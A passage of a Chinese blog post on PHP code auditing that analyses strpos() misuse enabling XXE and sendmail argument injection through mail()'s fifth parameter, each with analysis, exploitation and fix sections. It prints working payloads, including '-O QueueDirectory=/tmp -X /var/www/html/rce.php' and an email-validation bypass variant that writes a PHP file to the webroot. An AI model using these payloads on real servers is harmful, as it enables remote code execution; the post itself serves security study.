+<p><strong>说明</strong><br>int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )<br>返回 needle 在 haystack 中首次出现的数字位置。</p>
+<p><strong>参数</strong><br>haystack<br>在该字符串中进行查找。</p>
+<p>needle<br>如果 needle 不是一个字符串，那么它将被转换为整型并被视为字符的顺序值。</p>
+<p>offset<br>如果提供了此参数，搜索会从字符串该字符数的起始位置开始统计。 如果是负数，搜索会从字符串结尾指定字符数开始。</p>
+<p><strong>返回值</strong><br>返回 needle 存在于 haystack 字符串起始的位置(独立于 offset)。同时注意字符串位置是从0开始，而不是从1开始的。</p>
+<p>如果没找到 needle，将返回 FALSE。</p>
+<p><strong>Warning</strong><br>此函数可能返回布尔值 FALSE，但也可能返回等同于 FALSE 的非布尔值。请阅读 布尔类型章节以获取更多信息。应使用 === 运算符来测试此函数的返回值。</p>
+</blockquote>
+<p>这里<strong>Warning</strong>中已经提示了<code>strpos()</code>可能返回等同于FALSE的非布尔值，即在首位查询到了条件并返回了值为<code>0</code>，又因为PHP的弱类型特性，若没有使用<code>===</code>的强匹配，<code>0</code>就会等于<code>false</code>。</p>
+<h3 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h3><p> 前文已分析到令查询位置为首位即可，故payload可以为<code>user=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;&amp;pass=&lt;injected-tag&gt;</code></p>
+<p> 其中首位的<code>&lt;</code>可以令<code>strpo()</code>函数返回<code>0</code>即<code>FALSE</code>，从而绕过检查，<code>&quot;&gt;</code>是为了闭合之前的内容，然后就可以利用XML进行各种XXE攻击的利用</p>
+<h3 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h3><p>使用<code>===</code>强匹配</p>
+<hr>
+<h2 id="mali-函数的危险性"><a href="#mali-函数的危险性" class="headerlink" title="mali()函数的危险性"></a>mali()函数的危险性</h2><p>源代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mailer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitize</span><span class="params">($email)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> escapeshellarg($email);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'to'</span>])) &#123;</span><br><span class="line">            $data[<span class="string">'to'</span>] = <span class="string">'none@ripstech.com'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $data[<span class="string">'to'</span>] = <span class="keyword">$this</span>-&gt;sanitize($data[<span class="string">'to'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'from'</span>])) &#123;</span><br><span class="line">            $data[<span class="string">'from'</span>] = <span class="string">'none@ripstech.com'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $data[<span class="string">'from'</span>] = <span class="keyword">$this</span>-&gt;sanitize($data[<span class="string">'from'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'subject'</span>])) &#123;</span><br><span class="line">            $data[<span class="string">'subject'</span>] = <span class="string">'No Subject'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'message'</span>])) &#123;</span><br><span class="line">            $data[<span class="string">'message'</span>] = <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mail($data[<span class="string">'to'</span>], $data[<span class="string">'subject'</span>], $data[<span class="string">'message'</span>],</span><br><span class="line">             <span class="string">''</span>, <span class="string">"-f"</span> . $data[<span class="string">'from'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mailer = <span class="keyword">new</span> Mailer();</span><br><span class="line">$mailer-&gt;send($_POST);</span><br></pre></td></tr></table></figure></p>
+<h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>此漏洞主要是由于<code>mail()</code>函数的第五个参数，先看一下<code>mail()</code>函数的用法：</p>
+<blockquote>
+<p><strong>mail</strong></p>
+<p>(PHP 4, PHP 5, PHP 7)</p>
+<p>mail — 发送邮件</p>
+<p><strong>说明</strong></p>
+<p>bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]] )<br>发送一封电子邮件。</p>
+<p><strong>参数</strong></p>
+<p><strong>to</strong><br>收件人<br><strong>subject</strong><br>主题<br><strong>message</strong><br>邮件内容<br><strong>additional_headers</strong><br>添加邮件的额外头部，如<code>CC:</code>Carbon Copy(抄送)、<code>BCC:</code>Blind CarbonCopy(秘密抄送)<br><strong>additional_parameters</strong><br>传递给发送程序sendmail的额外参数。例如，当使用带有-f sendmail选项的sendmail时，可以使用此选项设置邮件发件人地址 。</p>
+</blockquote>
+<p>在Linux系统上， php 的 mail 函数在底层中已经写好了，默认调用 Linux 的 <strong>sendmail</strong> 程序发送邮件。而在额外参数( additional_parameters )中， sendmail 主要支持的选项有以下三种：</p>
+<blockquote>
+<p>-O option = value</p>
+<p>QueueDirectory = queuedir 选择队列消息</p>
+<p>-X logfile</p>
+<p>这个参数可以指定一个目录来记录发送邮件时的详细日志情况。</p>
+<p>-f from email</p>
+<p>这个参数可以让我们指定我们发送邮件的邮箱地址。</p>
+</blockquote>
+<p> 在PHP中使用<code>mail()</code>函数的话需要在<code>php.ini</code>中配置以下两个选项中的一种：<br> 1.配置好SMTP（Simple Mail Transfer Protocol）即简单邮件传输协议的服务器hostname和port来告诉PHP使用那个代理。<br> 2.配置好一个邮件程序的文件地址，使其作为MTA(Mail Transfer Agent)即邮件传输代理。</p>
+<p> 当PHP是用第2种方式配置的时候，<code>mail()</code>将传递给MTA程序运行，虽然PHP默认提供了<code>escapeshellcmd()</code>这个函数在这些<code>&amp;#;|*?~&lt;&gt;^()[]{}$\, \x0A 和 \xFF</code>字符前插入<code>\</code>进行转义以防止代码注入的安全性问题，但是<code>mail()</code>函数的第5个参数<code>$additional_parameters</code>允许用户添加新参数的特性使得可以被攻击者利用。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mail(<span class="string">"myfriend@example.com"</span>, <span class="string">"subject"</span>, <span class="string">"message"</span>, <span class="string">""</span>, <span class="string">"-f"</span> . $_GET[<span class="string">'from'</span>]); <span class="comment">//程序代码举例</span></span><br><span class="line"></span><br><span class="line">example@example.com -O QueueDirectory=/tmp -X /<span class="keyword">var</span>/www/html/rce.php <span class="comment">//payload举例 -O 可以用来重新配置sendmail选项 -X可以指定日志文件位置</span></span><br></pre></td></tr></table></figure></p>
+<p> 之前PHPMailer漏洞CVE-2016-10033就是这样发现的，影响到了包括像Wordpress这样广泛使用的程序。</p>
+<p> 说完<code>mail()</code>函数继续来分析源码，源码中第17行<code>$data[&#39;from&#39;]</code>为用户可控，并且传入到了第31行<code>mail()</code>函数中的第5参数中。虽然使用了<code>sanitize</code>函数进行过滤，<code>sanitize</code>函数首先调用了<code>FILTER_VALIDATE_EMAIL</code>过滤器验证传入值是否为有效的电子邮件地址，然后使用了<code>escapeshellarg</code>函数对返回值进行了转码过滤。</p>
+<p>首先讨论一下<code>FILTER_VALIDATE_EMAIL</code>这个过滤器，这个过滤器仅仅是以RFC822规则验证邮箱地址是否有效正确，但是并不会验证其安全性。附各PHP版本下绕过<code>FILTER_VALIDATE_EMAIL</code>的运行情况。可以看到在&gt;=5.2.0版本<code>fliter_var()</code>函数才被添加，其中某些版本会返回<strong>false</strong>，所以测试中需要注意版本。</p>
+<p><img src="/2018/08/06/php-code-review/FILTER_VALIDATE_EMAIL.jpg" alt="FILTER_VALIDATE_EMAIL"></p>
+<p>然后我们绕过<code>FILTER_VALIDATE_EMAIL</code>的情况下还需要绕过<code>escapeshellarg（）</code>和<code>escapeshellcmd（）</code>，先看一下PHP文档对这两个函数的描述。</p>
+<blockquote>
+<p><strong>escapeshellarg</strong></p>
+<p>(PHP 4 &gt;= 4.0.3, PHP 5, PHP 7)</p>
+<p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</p>
+<p><strong>说明</strong> </p>
+<p>string escapeshellarg ( string $arg )</p>
+<p>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。</p>
+</blockquote>
+<blockquote>
+<p><strong>escapeshellcmd</strong></p>
+<p>(PHP 4, PHP 5, PHP 7)</p>
+<p>escapeshellcmd — shell 元字符转义</p>
+<p><strong>说明</strong></p>
+<p>string escapeshellcmd ( string $command )</p>
+<p>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p>
+<p>反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p>
+</blockquote>
+<p>可以看到<code>escapeshellarg（）</code>和底层的<code>escapeshellcmd（）</code>是用来保护系安全，防止代码注入的转义函数。但是<code>escapeshellarg（）</code>和<code>escapeshellcmd（）</code>一起使用的话并不安全。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=escapeshellarg(<span class="string">"172.17.0.2' -v -d a=1"</span>);</span><br><span class="line">$b=escapeshellcmd(<span class="string">"172.17.0.2' -v -d a=1"</span>);</span><br><span class="line">$c=escapeshellcmd(escapeshellarg(<span class="string">"172.17.0.2' -v -d a=1"</span>));</span><br><span class="line">var_dump($a).PHP_EOL;</span><br><span class="line">var_dump($b).PHP_EOL;</span><br><span class="line">var_dump($c).PHP_EOL;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如上我们使用<code>172.17.0.2&#39; -v -d a=1</code>这样的payload来进行测试。<br>测试结果如下<br><img src="/2018/08/06/php-code-review/escape.jpg" alt="ESCAPE"><br>可以看到在第1、2、4种输出中，<code>escapeshellcmd(escapeshellarg(&quot;172.17.0.2&#39; -v -d a=1&quot;))</code>的输出为<code>string(28) &quot;&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;&quot;</code><br>详细分析一下：</p>
+<ol>
+<li>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code>。</li>
+<li>经过escapeshellarg处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d</code>a=1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
+<li>经过escapeshellcmd处理后变成<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，这是因为escapeshellcmd对<code>\</code>以及最后那个没有配对的<code>&#39;</code>进行了转义，而忽略对之前两对匹配了的<code>&#39;</code>进行转意。</li>
+<li>最后执行的命令是<code>&#39;curl 172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\</code>发起请求，<strong>POST</strong> 数据为<code>a=1&#39;</code>。</li>
+</ol>
+<p>此处分析学习自<a href="https://paper.seebug.org/164/" title="PHP escapeshellarg()+escapeshellcmd() 之殇" target="_blank" rel="noopener">https://paper.seebug.org/164/</a></p>
+<h3 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h3><p>最终传入<code>mail()</code>函数的第5参数的payload大概为<code>a&quot;&#39;(\ -OQueueDirectory=/tmp\ -X/var/www/html/test.php\ )&quot;@a.com</code>,在执行时变成了<code>&#39;-fa&quot;&#39;\\&#39;&#39;\( -OQueueDirectory=/tmp -X/var/www/html/test.php \)&quot;@a.com\&#39;</code>，如上面的分析<code>-f</code>为MTA预设参数，<code>&#39;-fa&quot;\\&#39;&#39;&#39;\(</code>为第一部分，转义后运行时相当于<code>-fa&quot;\(</code>,这部分作用就是将<code>-f</code>参数闭合造成后续payload逃逸形成注入；<code>-OQueueDirectory=/tmp</code>为第二部分可操作恶意内容，<code>-X/var/www/html/test.php</code>为第三部分可操作恶意内容，<code>\)&quot;@a.com\&#39;</code>为绕过<code>FILTER_VALIDATE_EMAIL</code>过滤的必须部分。这样结合起来就完成了注入，但是由于邮箱格式要求以及转义过多，真实进行测试时会带有很多<code>&quot;`</code>`<code>&#39;</code>符号，还需要多多调整来进行测试。</p>
+<h3 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h3><p><strong>PHPmailer</strong>官方的修复方案是，对用户传参的输入进行检测，如果有转义字符就不传递第5参数，也不会造成注入。<br>所以总结一下核心问题还是<code>escapeshellarg()</code>→<code>escapeshellcmd()</code>这一过程会出现重复转义造成的漏洞。</p>
+<hr>
+<h2 id=""><a href="#" class="headerlink" title="#"></a>#</h2>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/08/24/一次渗透纪实/" rel="prev" title="一次渗透纪实分享">
+                一次渗透纪实分享 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">JrD</p>
+              <p class="site-description motion-element" itemprop="description">Learning</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP代码审计学习"><span class="nav-number">1.</span> <span class="nav-text">PHP代码审计学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#in-array-函数误用"><span class="nav-number">1.1.</span> <span class="nav-text">in_array()函数误用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析"><span class="nav-number">1.1.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用"><span class="nav-number">1.1.2.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复"><span class="nav-number">1.1.3.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一个XSS过滤绕过trick"><span class="nav-number">1.2.</span> <span class="nav-text">一个XSS过滤绕过trick</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复-1"><span class="nav-number">1.2.3.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#class-exists函数和实例化可控导致的XXE漏洞"><span class="nav-number">1.3.</span> <span class="nav-text">class_exists函数和实例化可控导致的XXE漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复-2"><span class="nav-number">1.3.3.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#strpo-函数误用"><span class="nav-number">1.4.</span> <span class="nav-text">strpo()函数误用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析-3"><span class="nav-number">1.4.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用-3"><span class="nav-number">1.4.2.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复-3"><span class="nav-number">1.4.3.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mali-函数的危险性"><span class="nav-number">1.5.</span> <span class="nav-text">mali()函数的危险性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析-4"><span class="nav-number">1.5.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用-4"><span class="nav-number">1.5.2.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复-4"><span class="nav-number">1.5.3.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-number">1.6.</span> <span class="nav-text">#</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">JrD</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("Oveo6yO1BVk9E5uoIw3nW7IC-gzGzoHsz", "rBuNEf1Me0OCLis7Q9Lx8Vms");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
